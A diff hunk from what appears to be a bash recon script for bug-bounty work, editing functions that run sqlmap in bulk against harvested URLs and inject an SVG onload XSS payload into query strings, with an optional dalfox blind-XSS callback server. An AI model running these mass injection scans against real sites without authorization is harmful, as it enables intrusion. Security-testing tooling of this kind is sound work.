@@ -261,14 +261,14 @@ check_infoleak() {
 check_sqli() {
     sleep 1s
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Scanning for sqli vulnerabilities of $domain using sqlmap [${GREEN}${BLINK}92%${NORMAL}] \r"
-    cat parameters/patterns/sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --output-dir=scanresults/sqli/ 2> /dev/null" &> /dev/null
+    cat parameters/patterns/sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --output-dir=scanresults/sqli/" &> /dev/null
 }
 
 check_xss() {
     sleep 1s
     echo -ne "${NORMAL}${BOLD}${YELLOW} ● Scanning is in progress:${NORMAL}${BOLD} Checking for xss in $domain [${GREEN}${BLINK}95%${NORMAL}] \r"
     cat parameters/patterns/xss.txt | xargs -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | grep "< >" | anew -q scanresults/xss/kxss.txt &> /dev/null
-    cat parameters/patterns/xss.txt | qsreplace "\">/><svg/onload=confirm(document.domain)>" 2> dev/null | xargs -P 50 -I % bash -c "curl -s -L --insecure '%' | grep \"<svg/onload=confirm(document.domain)>\" && echo -e \"[POTENTIAL XSS] - % \n \"" 2> /dev/null | grep "POTENTIAL XSS" | anew vulnerabilities/injections/xss.txt | notify -silent &> /dev/null
+    cat parameters/patterns/xss.txt | qsreplace "\">/><svg/onload=confirm(document.domain)>" 2> dev/null | xargs -P 50 -I % bash -c "curl -s -L --insecure '%' | grep \"<svg/onload=confirm(document.domain)>\" && echo -e \"[POTENTIAL XSS] - % \n \"" 2> /dev/null | grep "POTENTIAL XSS" | anew scanresults/xss/xss.txt | notify -silent &> /dev/null
     if [ -n "$bxssServer" ]
         then
             dalfox file parameters/patterns/xss.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w $thrds -b $bxssServer 2> /dev/null | anew -q scanresults/xss/dalfox.txt &> /dev/null
